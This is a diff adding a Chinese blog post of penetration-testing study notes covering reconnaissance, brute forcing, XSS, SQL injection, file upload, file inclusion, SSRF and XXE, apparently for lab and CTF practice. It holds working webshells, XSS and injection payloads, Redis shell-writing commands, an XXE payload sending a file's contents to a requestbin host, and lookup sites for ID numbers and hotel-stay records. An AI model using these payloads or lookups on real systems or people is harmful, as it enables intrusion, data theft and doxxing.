@@ -156,6 +156,846 @@
     <ul class="post-list">
     
         <li class="post-list-item fade">
+            <article id="post-study"
+  class="article-card article-type-post" itemprop="blogPost">
+
+    <div class="post-meta">
+        <time class="post-time" title="2020-08-26 16:43:33" datetime="2020-08-26T08:43:33.000Z"  itemprop="datePublished">2020-08-26</time>
+
+        
+
+
+        
+    </div>
+
+    
+
+
+  
+    <h3 class="post-title" itemprop="name">
+      <a class="post-title-link" href="/2020/08/26/study/">study</a>
+    </h3>
+  
+
+
+
+
+    <div class="post-content" id="post-content" itemprop="postContent">
+
+    
+        <h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><p><strong>输入时一定要注意符号问题，中英文</strong></p>
+<p>0.0.0.0默认监听所有端口</p>
+<p>渗透测试（是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法</p>
+<p>受信任，</p>
+<p>脱库点到为止—count —start—stop，</p>
+<p>web有cs，bs结构，渗透手段有端口扫描、SSH口令爆破、FTP爆破、缓冲区溢出攻击，web攻击</p>
+<p>渗透测试阶段</p>
+<p>前期交互</p>
+<p>信息收集</p>
+<p>威胁建模</p>
+<p>漏洞分析</p>
+<p>渗透攻击</p>
+<p>后渗透攻击</p>
+<p>渗透报告</p>
+<p>渗透测试的本质就是信息收集（侯亮micro8）</p>
+<p>挖边缘业务漏洞</p>
+<p>expolit.db漏洞库</p>
+<p>inutl:t.me 社工库</p>
+<p>中间件：apache，iis，tomcat。nginx</p>
+<p>服务架构：lnmp,lamp，linux nginx/apache，mysql，php</p>
+<p>url编码</p>
+<p>switchyomega代理</p>
+<p>http请求：get,post,head,put,options</p>
+<p>http报文，状态码4为客户端，5为服务端</p>
+<p>403为存在目录，但禁止访问</p>
+<p>蚁剑</p>
+<p>apt -update自动换更新源，不需要vim</p>
+<h1 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h1><p>端口扫描，webrobot目录扫描</p>
+<p><em>*</em>的隐藏密码可以改变google检查中的type=“password”为type=”任意字符“来获取密码</p>
+<h2 id="google"><a href="#google" class="headerlink" title="google"></a>google</h2><p>通配符*</p>
+<p>逻辑非-</p>
+<p>2333 -习近平  去除百度右边广告</p>
+<p>site:baidu.com  扫资产</p>
+<p>intitle:后台登录</p>
+<p>inurl:url 关键字</p>
+<pre><code>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms
+intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com
+filetype:mdb|doc|xlsx|pdf
+密码 filetype:xls
+intitle:北京赛车 inurl:gov.cn
+</code></pre><h2 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h2><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p>
+<pre><code>Hikvision-Webs country:cn city:nanjing
+</code></pre><p>P@ssw0rd</p>
+<p>同模板网站查询 http.favicon.hash：hash</p>
+<p>hash为favicon.ico在shodan中的hash或mmh3.hash</p>
+<pre><code class="lang-python">import mmh3
+import requests
+
+response = requests.get(&#39;https://www.baidu.com/favicon.ico&#39;)
+favicon = response.content.encode(&#39;base64&#39;)
+hash = mmh3.hash(favicon)
+print(hash)
+</code></pre>
+<p>黑色星期五11月27号买shodan</p>
+<h2 id="shodan类似网站"><a href="#shodan类似网站" class="headerlink" title="shodan类似网站"></a>shodan类似网站</h2><p>zoomeye（知道创宇）</p>
+<p>fofa.co</p>
+<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>    （线上）</p>
+<p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>           subDomainsBrute</p>
+<p><a href="https://github.com/euphrat1ca/LayerDomainFinderLayer" target="_blank" rel="noopener">https://github.com/euphrat1ca/LayerDomainFinderLayer</a> 子域名挖掘机</p>
+<p>OneForAll</p>
+<p><a href="https://www.sqlsec.com/2020/05/webscan.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/webscan.html</a>   Django 编写 Web 漏洞扫描器挖坑记录</p>
+<pre><code class="lang-python"># 爱站
+https://baidurank.aizhan.com/baidu/{domain}/
+
+# 百度云观测
+http://ce.baidu.com/index/getRelatedSites?site_address={domain}
+
+# hackertarget
+https://api.hackertarget.com/hostsearch/?q={domain}
+
+# IP138
+https://site.ip138.com/{domain}/domain.htm
+
+# crt.sh SSL 证书反查
+https://crt.sh/?q=%25.{domain}
+
+# 千寻
+url = &#39;https://www.dnsscan.cn/dns.html&#39;
+datas = {&quot;ecmsfrom&quot;: &#39;8.8.8.8&#39;, &quot;show&quot;: &#39;none&#39;, &quot;keywords&quot;: domain}
+</code></pre>
+<p>写脚本获取域名</p>
+<h2 id="C段与服务器信息"><a href="#C段与服务器信息" class="headerlink" title="C段与服务器信息"></a>C段与服务器信息</h2><p>无cdn</p>
+<p><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a>    爱站</p>
+<p>scanport</p>
+<p><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a>     HTTPScan</p>
+<p>有cdn的话</p>
+<p>国内的 CDN 往往只会针对国内用户访问加速，但是 国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP</p>
+<p><a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a>    <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a>   多地ping</p>
+<p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a>        <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>   <a href="https://sitereport.netcraft.com/查询" target="_blank" rel="noopener">https://sitereport.netcraft.com/查询</a> ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。</p>
+<p>邮件中可以查询IP地址</p>
+<h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><a href="http://whois.bugscaner.com/" target="_blank" rel="noopener">whois.bugscaner.com</a></p>
+<p><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">whois.aizhan.com</a></p>
+<p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener"> whois.chinaz.com</a></p>
+<h3 id="注册网站查询"><a href="#注册网站查询" class="headerlink" title="注册网站查询"></a>注册网站查询</h3><p><a href="https://www.reg007.com/" target="_blank" rel="noopener">www.reg007.com</a></p>
+<h3 id="密码泄露查询"><a href="#密码泄露查询" class="headerlink" title="密码泄露查询"></a>密码泄露查询</h3><p><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">https://haveibeenpwned.com</a></p>
+<h3 id="开房记录查询"><a href="#开房记录查询" class="headerlink" title="开房记录查询"></a>开房记录查询</h3><p><a href="http://www.cxjlkf.com/" target="_blank" rel="noopener">http://www.cxjlkf.com</a></p>
+<h3 id="国家职业资格证查询"><a href="#国家职业资格证查询" class="headerlink" title="国家职业资格证查询"></a>国家职业资格证查询</h3><p><a href="http://zscx.osta.org.cn/" target="_blank" rel="noopener">http://zscx.osta.org.cn</a></p>
+<h3 id="其他查询"><a href="#其他查询" class="headerlink" title="其他查询"></a>其他查询</h3><p><strong>身份证查询</strong></p>
+<p><a href="http://www.2cha.com/" target="_blank" rel="noopener">http://www.2cha.com</a></p>
+<p><strong>经纬度查询</strong></p>
+<p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p>
+<p><a href="http://map.yanue.net/" target="_blank" rel="noopener">http://map.yanue.net/</a></p>
+<p><a href="http://www.gzhatu.com/jingweidu.html" target="_blank" rel="noopener">http://www.gzhatu.com/jingweidu.html</a></p>
+<p>通过iphone的图片获取现实地址</p>
+<p><strong>微信搜索</strong></p>
+<p><a href="https://weixin.sogou.com/" target="_blank" rel="noopener">https://weixin.sogou.com</a></p>
+<p><strong>泄露网站查询</strong></p>
+<p><a href="https://haveibeenpwned.com/PwnedWebsites" target="_blank" rel="noopener">https://haveibeenpwned.com/PwnedWebsites</a></p>
+<p><strong>邮件泄露查询</strong></p>
+<p><a href="https://www.hotsheet.com/inoitsu/" target="_blank" rel="noopener">https://www.hotsheet.com/inoitsu/</a></p>
+<p><strong>密码强度检测</strong></p>
+<p><a href="https://passwordsecurity.info/" target="_blank" rel="noopener">https://passwordsecurity.info</a></p>
+<p><a href="https://haveibeenpwned.com/Passwords" target="_blank" rel="noopener">https://haveibeenpwned.com/Passwords</a></p>
+<p><strong>Github 信息收集</strong></p>
+<p>password @qq.com</p>
+<p>db_pass</p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>主动与被动</p>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre><code>ip -o             扫系统类型
+10.11.30.1/24 -v  扫c段，-v输出日志
+-p                端口
+-p0/pn            不进行ping
+--packet-trace    查看协议扫描的细节
+-PR选项通常在扫描局域网时使用
+--traceroute      路由跟踪
+
+| -oN  | 标准保存 |
+| ---- | -------- |
+| -oX  | XML 保存 |
+</code></pre><h2 id="zenmap"><a href="#zenmap" class="headerlink" title="zenmap"></a>zenmap</h2><p>quick scan plus模式</p>
+<p>10.11.30.1/24</p>
+<h2 id="linux扫描"><a href="#linux扫描" class="headerlink" title="linux扫描"></a>linux扫描</h2><pre><code class="lang-bash">#!/bin/bash
+ip=&quot;172.16.114.&quot;
+
+echo &quot;ping log:&quot; &gt; ./ping.txt
+for i in {1..254}
+do
+    ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;
+done
+echo &quot;wait 5s....&quot;
+sleep 5
+cat ./ping.txt
+cat ./ping.txt | wc -l
+</code></pre>
+<h2 id="windows扫描"><a href="#windows扫描" class="headerlink" title="windows扫描"></a>windows扫描</h2><pre><code class="lang-bash">for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I
+</code></pre>
+<p><strong>cmder</strong>     windows下可以使用linux命令</p>
+<h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p>
+<pre><code class="lang-bash">masscan -sL 10.0.0.0/24 &gt; c段.txt
+masscan -sL 10.0.0.0/16 &gt; b段.txt
+masscan -sL 10.0.0.0/8  &gt; a段.txt
+# 输出到文件中
+masscan 0.0.0.0/0 -p0-65535 -oX scan.xml
+</code></pre>
+<p>massan扫b段（10.1.1.1/16）后发现c（段10.1.5.1/24）资产再用nmap扫c段</p>
+<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><p>用pycharm对字符串进行正则替换</p>
+<pre><code>((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}
+</code></pre><pre><code class="lang-bash"># 换行
+^\s*(?=\r?$)\n
+</code></pre>
+<p>^匹配头部，$匹配尾部</p>
+<h2 id="GOBY"><a href="#GOBY" class="headerlink" title="GOBY"></a>GOBY</h2><p><a href="https://cn.gobies.org/" target="_blank" rel="noopener">https://cn.gobies.org/</a></p>
+<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="awvs"><a href="#awvs" class="headerlink" title="awvs"></a>awvs</h2><pre><code class="lang-bash">#  pull 拉取下载镜像
+docker pull secfa/docker-awvs
+
+#  将Docker的3443端口映射到物理机的 13443端口
+docker run -it -d -p 13443:3443 secfa/docker-awvs
+
+# 容器的相关信息
+awvs13 username: admin@admin.com
+awvs13 password: Admin123
+AWVS版本：13.0.200217097
+</code></pre>
+<p>浏览器访问：<a href="https://127.0.0.1:13443/#/about" target="_blank" rel="noopener">https://127.0.0.1:13443/ </a>即可</p>
+<p>webrobot类似awvs目录扫描</p>
+<p>漏洞网站   <a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></p>
+<h2 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h2><p>可以用来扫主机</p>
+<h2 id="x-ray"><a href="#x-ray" class="headerlink" title="x-ray"></a>x-ray</h2><p>挖洞</p>
+<h1 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h1><h2 id="web认证"><a href="#web认证" class="headerlink" title="web认证"></a>web认证</h2><p>bp普通爆破</p>
+<p><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">https://www.ctfhub.com/</a></p>
+<p>Pitchfork模式爆破token，找到 「Grep - Extract」添加一个 Grep 查询筛选， 接着点击refetch response，然后鼠标选择要提取的 token，此时 Burpsuite 会自动生成对应的匹配规则</p>
+<ol>
+<li>使用 Burpsuite 进行无验证码爆破</li>
+<li>使用 Burpsuite 进行 Basic 认证爆破</li>
+<li>使用 Burpsuite 进行纯数字爆破</li>
+<li>使用 Pkav HTTP Fuzzer 进行带验证码的爆破</li>
+<li>tomcat8.0及以上爆破用msf</li>
+</ol>
+<h2 id="系统认证"><a href="#系统认证" class="headerlink" title="系统认证"></a>系统认证</h2><p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a></p>
+<p><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p>
+<p>能爆smb就不要rdp</p>
+<p>SMB 爆破首选 MSF</p>
+<p>redis被爆破速度超级快</p>
+<h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>1改变ssh 公私钥需要手动换三行</p>
+<p>2web /var/www/html shell.php </p>
+<pre><code>&lt;?php @eval($_POST[&#39;attack&#39;]);?&gt;
+</code></pre><p>3定时 弹shell</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>“” ‘’  //三种包含方式</p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;
+</code></pre><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><p>提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS</p>
+<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><pre><code>&#39; onerror=alert(233) x=&#39;
+</code></pre><pre><code>&#39; onerror=alert(233) //
+</code></pre><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>alert被过滤时，可以用promat或</p>
+<pre><code>xsspayload&lt;img src=x onerror=confirm(1)&gt;
+</code></pre><p>双写，大写绕过，</p>
+<pre><code>&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;
+</code></pre><p>也可以通过<code>String.fromCharCode()</code>编码来绕过，使用Hackbar可以很方便地进行编码alert(‘XSS’)经过String.fromCharCode()编码为:</p>
+<pre><code>String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41)
+</code></pre><pre><code>name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/scr
+</code></pre><pre><code class="lang-php+HTML"> &#39;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;存在漏洞，htmlentities不过滤&#39;,&#39;&#39;闭合
+</code></pre>
+<p>前端改限制输入长度</p>
+<h2 id="真实"><a href="#真实" class="headerlink" title="真实"></a>真实</h2><p>蓝莲花或<a href="https://xss8.cc/xss.php或***xss.pt***写xss脚本，生成payload，将有xss漏洞的页面与payload合成，站长之家生成短链" target="_blank" rel="noopener">https://xss8.cc/xss.php或***xss.pt***写xss脚本，生成payload，将有xss漏洞的页面与payload合成，站长之家生成短链</a></p>
+<p>盲打钓鱼网站，网站生成脚本，直接提交</p>
+<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><p>bp生成csrf表单</p>
+<p>添加自动提交</p>
+<pre><code>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
+</code></pre><h1 id="sql注入技巧"><a href="#sql注入技巧" class="headerlink" title="sql注入技巧"></a>sql注入技巧</h1><p>输入?id=1’x或1”x等，复制 ‘x”) LIMIT 0,1’ 中间的部分，补足左边的部分</p>
+<p>来得到sql语句(“x”) LIMIT 0,1</p>
+<p>/**/代替空格</p>
+<h2 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h2><p>post不能将空格替换为+</p>
+<p>SEPARATOR +分隔符</p>
+<pre><code>http://localhost/sqli-labs/Less-4/
+?id=-1&quot;) union select 1,(SELECT+GROUP_CONCAT(username,password,id+SEPARATOR+0x3c62723e)+FROM+users),3--+
+</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>-v 3</p>
+<p>—risk 3</p>
+<p>—-technique=E 报错注入=U联合查询</p>
+<p>—user-agent=”hacker by qq11111”扫gov警告</p>
+<p>—random-agent 绕waf</p>
+<p> —prefix  和  —suffix </p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>asp</p>
+<pre><code class="lang-asp">&lt;%eval request(&quot;x&quot;)%&gt;
+
+&lt;%execute request(&quot;x&quot;)%&gt;
+</code></pre>
+<p>php</p>
+<pre><code class="lang-php">&lt;?php eval($_POST[&#39;x&#39;]);?&gt;
+_get,_request,_cookie
+&lt;?php assert($_POST[&#39;x&#39;]);?&gt;
+</code></pre>
+<p>jsp</p>
+<pre><code class="lang-jsp">&lt;%
+    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))
+    {
+        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(&quot;&lt;pre&gt;&quot;);
+        while((a=in.read(b))!=-1)
+        {
+            out.println(new String(b));
+        }
+        out.print(&quot;&lt;/pre&gt;&quot;);
+    }
+%&gt;
+</code></pre>
+<p>jar cvf cmd.war cmd.jsp</p>
+<p>访问war/war.jsp</p>
+<h2 id="chrome调试"><a href="#chrome调试" class="headerlink" title="chrome调试"></a>chrome调试</h2><p>在soures下断点，运行后在修改前端代码</p>
+<h2 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h2><pre><code class="lang-ini">AddType application/x-httpd-php .png
+</code></pre>
+<h2 id="mime"><a href="#mime" class="headerlink" title="mime"></a>mime</h2><p>image/png</p>
+<h2 id="图片木马"><a href="#图片木马" class="headerlink" title="图片木马"></a>图片木马</h2><p>添加后缀</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>后缀</th>
+<th>文件头</th>
+<th>文本类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PNG</td>
+<td>89504E47</td>
+<td>‰[不可显示字符]PNG</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>47494638</td>
+<td>GIF89a</td>
+</tr>
+<tr>
+<td>JPEG</td>
+<td>FFD8FF</td>
+<td>ÿØÿ</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>windows生成图马</p>
+<pre><code class="lang-bash">copy pic.jpg/b+shell.php/a shell.jpg
+</code></pre>
+<p>参数<code>/b</code>指定以二进制格式复制、合并文件， 用于图像类/声音类文件</p>
+<p>参数<code>/a</code>指定以 ASCII 格式复制、合并文件，用于 txt 等文本类文件</p>
+<p>linux</p>
+<pre><code class="lang-bash">cat shell.php &gt;&gt; shell.png
+</code></pre>
+<p>图马上传到一半抓包改为php上传</p>
+<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>PHP&lt;5.8.4</p>
+<p>关闭magic_quotes_gpc</p>
+<p>修改var/www/html/upload</p>
+<p>​    为var/www/html/upload/x.php%00</p>
+<p>然后正常上传png</p>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>删除前不停上传并访问生成2次木马</p>
+<pre><code class="lang-php">&lt;?php fputs(fopen(&#39;gg.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[1])?&gt;&#39;);?&gt;
+</code></pre>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre><code class="lang-php">include(), include_once(), require(), require_once(), fopen(), readfile()
+</code></pre>
+<pre><code class="lang-bash">本地
+?file=../../../../../../../../windows/win.ini
+?file=C:\Windows\win.ini
+远程
+?file=http://192.168.31.89/fi/payload.txt
+?file=http://www.baidu.com/robots.txt（通用测试是否允许远程文件包含）
+？file=file:///C:/Windows/win.ini
+</code></pre>
+<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><h3 id="php-lt-5-34"><a href="#php-lt-5-34" class="headerlink" title="php&lt;=5.34"></a>php&lt;=5.34</h3><p>%00截断</p>
+<p>路径长度截断</p>
+<p>点号截断</p>
+<h3 id="php所有版本"><a href="#php所有版本" class="headerlink" title="php所有版本"></a>php所有版本</h3><pre><code class="lang-bash"># 空格截断
+?file=http://192.168.31.89/fi/payload.txt%20
+
+# 问号截断
+?file=http://192.168.31.89/fi/payload.txt?
+
+# 井号截断
+?file=http://192.168.31.89/fi/payload.txt%23
+</code></pre>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="php-filter（文件读取"><a href="#php-filter（文件读取" class="headerlink" title="php://filter（文件读取"></a>php://filter（文件读取</h3><pre><code class="lang-bash">?file=php://filter/read=convert.base64-encode/resource=index.php
+?file=php://filter/convert.base64-encode/resource=index.php
+</code></pre>
+<h3 id="php-input（写入木马）"><a href="#php-input（写入木马）" class="headerlink" title="php://input（写入木马）"></a>php://input（写入木马）</h3><pre><code>?file=php://input
+</code></pre><p>post数据</p>
+<pre><code class="lang-php">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&#39;);?&gt;
+</code></pre>
+<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><p><strong>条件</strong>：</p>
+<ul>
+<li>allow_url_fopen=On</li>
+<li>allow_url_include=On</li>
+<li>PHP &gt; 5.2</li>
+</ul>
+<pre><code class="lang-bash">?file=data:text/plain,&lt;?php phpinfo();?&gt;
+?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<pre><code class="lang-bash">&lt;?php phpinfo();?&gt; base64编码后url编码为PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h3><p><strong>条件</strong>：PHP &gt;= 5.3</p>
+<pre><code class="lang-bash">?file=phar://payload.zip/payload.txt
+?file=phar://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip/payload.txt
+</code></pre>
+<h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><pre><code class="lang-bash">?file=zip://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip%23payload.txt
+</code></pre>
+<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>LFI 头像，日志，session，</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>扫描，指纹识别，file读文件，dict探测端口，Gopher://协议</p>
+<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p>PHP: 1. file_get_contents() 2. fsockopen() 3. curl_exec() 4. fopen()</p>
+<p>Python: 1. urllib 库http头注入 2. requests 等库中默认跟随30x跳转</p>
+<h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><h3 id="正常写"><a href="#正常写" class="headerlink" title="正常写"></a>正常写</h3><p>redis-cli -h 127.0.0.1 flushall</p>
+<p>redis-cli -h 127.0.0.1 config set dir /var/www/html </p>
+<p>redis-cli -h 127.0.0.1 config set dbfilename shell.php </p>
+<p>redis-cli -h 127.0.0.1 set webshell </p>
+<pre><code>&quot;&lt;?php phpinfo(); ?&gt;&quot;
+</code></pre><p>redis-cli -h 127.0.0.1 save</p>
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>gopher*为参数数量，$为参数长度</p>
+<p>Gopherus-master可以自动生成gopher payload,</p>
+<p>选择phpshell，for-data不解码，www-urlencode和get请求需要在编码一次 ，默认网页位置为/var/www/html/index.php</p>
+<p>可以urllib头注入</p>
+<p>利用http状态码30x 来探测端口、服务，穿过几层就编码几次</p>
+<h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><h3 id="短网址生成"><a href="#短网址生成" class="headerlink" title="短网址生成"></a>短网址生成</h3><h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h3><p>127.0.0.1.xip.io</p>
+<h3 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h3><pre><code>file://localhost/etc/passwd
+file://localhost/etc/hosts
+file:///proc/net/fib_trie
+</code></pre><h3 id="ip格式"><a href="#ip格式" class="headerlink" title="ip格式"></a>ip格式</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433 </p>
+<p>把.换成。</p>
+<p>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01 </p>
+<p>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01 </p>
+<p>省略写法：127.0.0.1-&gt;127.1 如127.0.0.1：<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a></p>
+<h2 id="进阶利用"><a href="#进阶利用" class="headerlink" title="进阶利用"></a>进阶利用</h2><p>log，time，差异化</p>
+<h3 id="dns-rebinding"><a href="#dns-rebinding" class="headerlink" title="dns rebinding"></a>dns rebinding</h3><p><a href="http://ceye.io/profile" target="_blank" rel="noopener">http://ceye.io/profile</a></p>
+<p>有一个域名，开了 dns rebinding 那个功能，设置返回 223.5.5.5 和 127.0.0.1</p>
+<p>验证时解析该域名返回 223.5.5.5，通过。</p>
+<p>正式请求时该域名解析返回的则是 127.0.0.1。</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>有回显</p>
+<p>file:///etc/passwd</p>
+<p><a href="http://127.0.0.1:8891/hide.php" target="_blank" rel="noopener">http://127.0.0.1:8891/hide.php</a><br>phar://phar.phar/test.txt</p>
+<p>无回显</p>
+<p>http.requestbin.buuoj.cn/获取请求内容</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://http.requestbin.buuoj.cn/179swmw1?p=%file;&#39;&gt;&quot;&gt;
+</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;!DOCTYPE dasctf[
+        &lt;!ENTITY % remote SYSTEM &quot;http://10.11.33.142:8081/test2.dtd&quot; &gt;
+        %remote;%int;%send;
+]&gt;
+&lt;books&gt;
+    &lt;name&gt;abc&lt;/name&gt;
+&lt;/books&gt;
+</code></pre><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><pre><code>` `
+eval(&quot;phpinfo();&quot;),需要加;
+assert(&quot;phpinfo()&quot;)
+popen
+exec
+passthru
+</code></pre><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>php -S 127.0.0.1:8091 -t ./ 运行</p>
+<p>ctrl+shirt+f全局搜索</p>
+<pre><code>eval(&#39;?&gt;&#39; . file_get_contents(&#39;
+</code></pre><p>高危函数file_get_contents(‘php://input’)，eval()等找可以控制的地方</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="C:\Users\夏尔\AppData\Roaming\Typora\typora-user-images\image-20200806112825072.png" alt="image-20200806112825072" title="">
+                </div>
+                <div class="image-caption">image-20200806112825072</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="C:\Users\夏尔\AppData\Roaming\Typora\typora-user-images\image-20200806112711269.png" alt="image-20200806112711269" title="">
+                </div>
+                <div class="image-caption">image-20200806112711269</div>
+            </figure>
+<figure class="image-bubble">
